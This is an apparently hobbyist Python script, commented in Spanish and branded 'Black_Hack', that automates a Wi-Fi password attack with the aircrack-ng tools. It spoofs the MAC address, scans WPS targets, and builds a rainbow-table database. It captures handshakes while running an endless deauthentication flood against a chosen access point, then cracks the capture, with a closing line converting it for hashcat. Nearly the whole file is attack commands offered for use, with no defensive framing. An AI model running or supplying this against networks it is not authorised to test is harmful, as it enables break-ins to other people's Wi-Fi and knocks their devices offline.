#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading
from io import open
## Crador Smp_A
# Fecha 25.7.2020
# Licencia Open soft GNU
# Nombre programa Rambo WiFi telefono
# Tipo Script shell
# Hack pin wps Wifi basado en craking rainbow
# lenguaje Python3 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet        Smp_A')
print("		 Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["opciones:","1) selec Wlan & changer Mac" ,"2) Scaner red ", "3) capture", "4) crack", "5) Exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
	print(listamenu[5])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def config():
	global wlan
	while True:
		try:
			os.system("ifconfig")
			wlan=input("Introduzca Wlan: ")
			print("Procesando")
			os.system('ip link set '+wlan+' up')
			os.system('airmon-ng check kill')
			os.system('ifconfig '+wlan+' down')
			os.system('macchanger -A '+wlan)
			os.system('ifconfig '+wlan+' up') 
			os.system('airmon-ng start '+wlan)
			return wlan
			break
		except TypeError:
			print("Wlan no permitida")

def scan(wlan):
	global bssid
	global canal

	os.system('wash -i '+wlan)

	bssid=input("seleccione BSSID : ")
	canal=input("seleccione CHANEL : ")
	ESSID=input("seleccione ESSID : ")

	file = open("/root/Especial_termux_kali/essidfile.txt","w")
	file.write(ESSID)
	file.close() 
	os.system('airolib-ng raibonw-db --import passwd wordlist.lst')
	os.system('airolib-ng rainbow-db --import essid essidfile.txt')
	os.system('airolib-ng rainbow-db --batch')
	os.system('airolib-ng rainbow-db --verify all')

	return bssid,canal

def attack(wlan,bssid,canal):
	os.system('x-terminal-emulator -e airodump-ng -c '+canal+' -w file --bssid '+bssid+' '+wlan)
	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')

def crack(wlan):
	os.system('aircrack-ng -r rainbow-db file-01.cap')

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		config()
		print(wlan)
	elif (key==2):
		scan(wlan)
	elif (key==3):
		attack(wlan,bssid,canal)
	elif (key==4):
		crack(wlan)
	elif (key==5):
		
		#os.syste('airmon-ng stop wlan0mon')
		#os.syste('ifconfig wlan0 down')
		#os.syste('iwconfig wlan0 mode managed')
		#os.syste('ifconfig wlan0 up')
		#os.system('service network-manager start')
		exit=True
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
./cap2hccapx.bin '/root/Especial_termux_kali/file-01.cap' /root/Especial_termux_kali/file-01.hccapx convertir cap 